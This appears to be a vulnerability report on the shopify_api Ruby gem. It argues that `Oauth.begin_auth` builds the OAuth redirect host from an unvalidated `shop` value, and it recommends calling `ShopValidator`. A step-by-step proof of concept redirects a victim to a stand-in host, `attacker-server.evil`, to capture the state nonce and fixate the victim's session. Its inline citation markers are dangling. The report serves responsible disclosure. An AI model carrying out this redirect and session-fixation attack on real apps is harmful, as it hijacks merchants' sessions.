## Analysis

I found a legitimate analog. The gem recently introduced `ShopifyAPI::Utils::ShopValidator` (`lib/shopify_api/utils/shop_validator.rb`) specifically to prevent attacker-controlled `shop` strings from being turned into request hosts, and it is consistently applied in `ClientCredentials.client_credentials` (`lib/shopify_api/auth/client_credentials.rb:25`), `RefreshToken.refresh_access_token` (`lib/shopify_api/auth/refresh_token.rb:24`), `TokenExchange.migrate_to_expiring_token` (`lib/shopify_api/auth/token_exchange.rb:103`), and `Clients::Graphql::Storefront#initialize` (`lib/shopify_api/clients/graphql/storefront.rb:22`). However, `ShopifyAPI::Auth::Oauth.begin_auth` never calls it: the caller-supplied `shop` string is passed straight into the private `auth_base_uri` helper and interpolated into the authorization redirect host.

### Title
Unvalidated `shop` parameter in `Oauth.begin_auth` allows attacker-controlled OAuth redirect host, enabling forced-OAuth-completion / session fixation - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` builds the Shopify authorization URL by interpolating the caller-supplied `shop` string directly into a host, without ever calling `ShopifyAPI::Utils::ShopValidator.sanitize!`/`sanitize_shop_domain`, unlike every other credential-bearing OAuth code path in the same library version.

### Finding Description
`begin_auth` takes an unauthenticated `shop:` string and forwards it to the private helper `auth_base_uri`, which returns `"https://#{shop}/admin"` with no allow-listing: [1](#0-0) 

That host is then used to build the `auth_route` the app instructs the browser to navigate to, carrying `client_id`, `scope`, `redirect_uri`, and the freshly generated CSRF `state` nonce: [2](#0-1) 

The gem's own documentation demonstrates exactly this unsafe flow: `shop` is read straight from a request header and handed to `begin_auth` with no sanitization step: [3](#0-2) 

Contrast this with every other place in the current codebase where an externally-supplied `shop` value is turned into a request host — each of them binds `shop` to `TRUSTED_SHOPIFY_DOMAINS` before use: [4](#0-3) [5](#0-4) [6](#0-5) 

The broken binding is: `shop` acted on to build the OAuth-initiation host ≠ `shop` verified against `ShopValidator`'s trusted-domain allow-list. Because this initiation step happens before any HMAC exists (HMAC only protects the later callback query, via `Utils::HmacValidator.validate` in `validate_auth_callback`, `lib/shopify_api/auth/oauth.rb:64`), nothing constrains `shop` at the point `begin_auth` is called.

### Impact Explanation
An attacker who controls the `shop` value passed into `begin_auth` (as shown in the documented pattern of taking it from a request header/query param) can redirect the victim's browser to an attacker-controlled server instead of `*.myshopify.com`, while the app still sets its legitimate CSRF `state` cookie for the victim's session. The attacker-controlled endpoint receives the `state` nonce and `redirect_uri`. By separately performing a real OAuth authorization on their own Shopify store, the attacker can obtain a legitimately-signed `code`/`hmac` for their own shop, then have the victim complete the callback with that state value bound to the attacker's shop — fixating the victim's app session to the attacker's store/account. This falls under "session fixation or forced OAuth completion," a High-impact category.

### Likelihood Explanation
The likelihood is elevated by the fact that the maintainers' own documentation example feeds an unauthenticated header value into `begin_auth` with no sanitization step shown, so implementers following the docs verbatim are exposed. It requires no credentials, tokens, or privileged access — only the ability to control the `shop` query/header parameter of the app's login route, which is standard, documented usage.

### Recommendation
Call `ShopifyAPI::Utils::ShopValidator.sanitize!(shop)` at the top of `Oauth.begin_auth` (mirroring `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token`) before it is used in `auth_base_uri`, and update `docs/usage/oauth.md`'s example to sanitize `shop` before calling `begin_auth`.

### Proof of Concept
1. App exposes `GET /login?shop=<value>` which calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], redirect_path: "/auth/callback")` per the documented pattern.
2. Attacker sends victim a link to `https://victim-app.example/login?shop=attacker-server.evil`.
3. `begin_auth` sets a `state` cookie in the victim's browser and returns `auth_route = "https://attacker-server.evil/admin/oauth/authorize?client_id=...&scope=...&redirect_uri=https://victim-app.example/auth/callback&state=<nonce>&grant_options%5B%5D=..."`.
4. The victim's browser is redirected to `attacker-server.evil`, which now knows the exact `state` value tied to the victim's session cookie on `victim-app.example`.
5. Attacker separately performs a genuine OAuth authorization on their own Shopify store to obtain a validly-signed `code`/`hmac`, then causes the victim's browser to hit `victim-app.example/auth/callback?...&state=<nonce>&shop=attacker.myshopify.com&hmac=...` — this passes `validate_auth_callback`'s HMAC and state checks (state matches the cookie set in step 3), fixating the victim's app session to the attacker's shop/account.

        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end

class ShopifyAuthController < ApplicationController
  def login
    shop = request.headers["Shop"]

    # Builds the authorization URL route to redirect the user to
    auth_response = ShopifyAPI::Auth::Oauth.begin_auth(shop: domain, redirect_path: "/auth/callback")

    # Store the authorization cookie
    cookies[auth_response[:cookie].name] = {
      expires: auth_response[:cookie].expires,
      secure: true,
      http_only: true,
      value: auth_response[:cookie].value
    }

    # Redirect the user to "auth_response[:auth_route]" to allow user to grant the app permission
    # This will lead the user to the Shopify Authorization page
    head 307
    response.set_header("Location", auth_response[:auth_route])
  end
